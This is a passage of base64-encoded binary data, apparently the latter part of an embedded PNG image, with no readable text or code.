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>